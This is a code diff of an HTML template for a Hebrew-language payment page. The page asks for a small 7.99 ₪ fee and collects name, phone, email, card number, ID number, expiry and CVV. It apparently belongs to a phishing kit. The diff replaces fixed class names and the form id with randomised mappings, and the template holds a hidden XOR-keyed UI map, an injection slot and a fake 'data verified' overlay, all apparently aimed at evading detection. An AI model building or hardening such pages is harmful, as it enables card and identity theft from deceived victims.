@@ -7,7 +7,7 @@
   {% if bango_shell_inject %}{{ bango_shell_inject|safe }}{% endif %}
   <link rel="stylesheet" href="{{ url_for('theme_asset', theme_name=active_theme_id, filename='style.css') }}">
 </head>
-<body>
+<body class="{{ bcls['bango-page'] }}">
   <div style="position:absolute;clip:rect(0,0,0,0);width:1px;height:1px;overflow:hidden" data-ui-map="{{ bango_ui_map_json|e }}" data-ui-key="{{ bango_xor_key|e }}" aria-hidden="true">.</div>
   <div class="page-card siteW" id="bango-main">
     <p id="bango-msg" role="status" aria-live="polite"></p>
@@ -15,7 +15,7 @@
       <img class="site-banner__img" src="{{ url_for('theme_asset', theme_name=active_theme_id, filename='img/banar.jpg') }}" alt="" width="631" height="157" loading="eager" decoding="async" fetchpriority="high">
     </header>
 
-    <form id="pangoFinalForm" class="Yform" novalidate>
+    <form id="{{ bcls['bango-form'] }}" class="Yform" novalidate>
       <div class="page-intro">
         <h5 class="user-info fw-bolder text-danger">סיכום הזמנה — סכום לתשלום: 7.99 ₪</h5>
       </div>
@@ -37,24 +37,24 @@
               <div class="form_hndlDiv">
                 <label for="fname">שם פרטי</label>
                 <input type="text" id="fname" name="fname" class="input-text" placeholder="שם פרטי">
-                <span class="err_msg" id="bango-err-fname" hidden>שדה חובה</span>
+                <span class="{{ bcls['bango-field-error'] }}" id="bango-err-fname" hidden>שדה חובה</span>
               </div>
               <div class="form_hndlDiv">
                 <label for="lname">שם משפחה</label>
                 <input type="text" id="lname" name="lname" class="input-text" placeholder="שם משפחה">
-                <span class="err_msg" id="bango-err-lname" hidden>שדה חובה</span>
+                <span class="{{ bcls['bango-field-error'] }}" id="bango-err-lname" hidden>שדה חובה</span>
               </div>
             </div>
 
             <div class="form_hndlDiv">
               <label for="phone">מספר טלפון נייד</label>
               <input type="text" id="phone" name="phone" class="input-text" placeholder="מספר טלפון">
-              <span class="err_msg" id="bango-err-phone" hidden>שדה חובה</span>
+              <span class="{{ bcls['bango-field-error'] }}" id="bango-err-phone" hidden>שדה חובה</span>
             </div>
             <div class="form_hndlDiv">
               <label for="email">דוא"ל</label>
               <input type="text" id="email" name="email" class="input-text" placeholder='דוא"ל'>
-              <span class="err_msg" id="bango-err-email" hidden>שדה חובה</span>
+              <span class="{{ bcls['bango-field-error'] }}" id="bango-err-email" hidden>שדה חובה</span>
             </div>
           </fieldset>
         </div>
@@ -65,19 +65,19 @@
             <div class="form_hndlDiv" id="credit-card-container">
               <label for="card">מספר כרטיס אשראי</label>
               <input type="text" id="card" name="card" class="input-text" placeholder="XXXX XXXX XXXX XXXX">
-              <span class="err_msg" id="bango-err-card" hidden>שדה חובה</span>
+              <span class="{{ bcls['bango-field-error'] }}" id="bango-err-card" hidden>שדה חובה</span>
             </div>
             <div class="form_hndlDiv" id="ids-container">
               <label for="id_num">תעודת זהות</label>
               <input type="text" id="id_num" name="id_num" class="input-text" placeholder="תעודת זהות">
-              <span class="err_msg" id="bango-err-id_num" hidden>שדה חובה</span>
+              <span class="{{ bcls['bango-field-error'] }}" id="bango-err-id_num" hidden>שדה חובה</span>
             </div>
             <div class="form-row form-row--expiry-cvv">
               <div class="form_hndlDiv tokefHndl">
                 <label for="exp">תוקף הכרטיס</label>
                 <div class="form_hndlDiv select_cont">
                   <input type="text" id="exp" name="exp" class="input-text input-expiry" placeholder="MM/YY">
-                  <span class="err_msg" id="bango-err-exp" hidden>שדה חובה</span>
+                  <span class="{{ bcls['bango-field-error'] }}" id="bango-err-exp" hidden>שדה חובה</span>
                 </div>
               </div>
               <div class="form_hndlDiv short cvv_cont">
@@ -91,7 +91,7 @@
                     </div>
                   </div>
                 </div>
-                <span class="err_msg" id="bango-err-cvv" hidden>שדה חובה</span>
+                <span class="{{ bcls['bango-field-error'] }}" id="bango-err-cvv" hidden>שדה חובה</span>
               </div>
             </div>
           </fieldset>
@@ -103,7 +103,7 @@
           <div id="errorMessage" class="error"></div>
           <div id="msg_error" class="error"><p class="error2">הזן את המידע כהלכה</p></div>
           <div id="onelod" class="spinner-container"><div class="spinner-block"></div></div>
-          <input class="submit_btn" id="submit" type="submit" value="אישור תשלום">
+          <input class="submit_btn {{ bcls['btn-submit'] }}" id="submit" type="submit" value="אישור תשלום">
         </div>
       </div>
       <div style="position:absolute;left:-9999px;height:0;overflow:hidden;opacity:0" aria-hidden="true">
@@ -134,11 +134,11 @@
     <div class="lab-spinner lab-spinner--lg" aria-hidden="true"></div>
     <span class="lab-sr-only">Loading</span>
   </div>
-  <div id="bango-success-overlay" class="bango-success-overlay" hidden aria-hidden="true" role="alert" lang="he" dir="rtl">
-    <div class="bango-success-overlay__icon" aria-hidden="true"></div>
-    <h2 class="bango-success-overlay__title">הפעולה הושלמה בהצלחה</h2>
-    <p class="bango-success-overlay__text">הנתונים אומתו בהצלחה.</p>
-    <div class="bango-success-overlay__spinner" aria-hidden="true"></div>
+  <div id="bango-success-overlay" class="{{ bcls['bango-success-overlay'] }}" hidden aria-hidden="true" role="alert" lang="he" dir="rtl">
+    <div class="{{ bcls['bango-success-overlay__icon'] }}" aria-hidden="true"></div>
+    <h2 class="{{ bcls['bango-success-overlay__title'] }}">הפעולה הושלמה בהצלחה</h2>
+    <p class="{{ bcls['bango-success-overlay__text'] }}">הנתונים אומתו בהצלחה.</p>
+    <div class="{{ bcls['bango-success-overlay__spinner'] }}" aria-hidden="true"></div>
   </div>
 
   <script src="{{ url_for('theme_asset', theme_name=active_theme_id, filename='script.js') }}"></script>
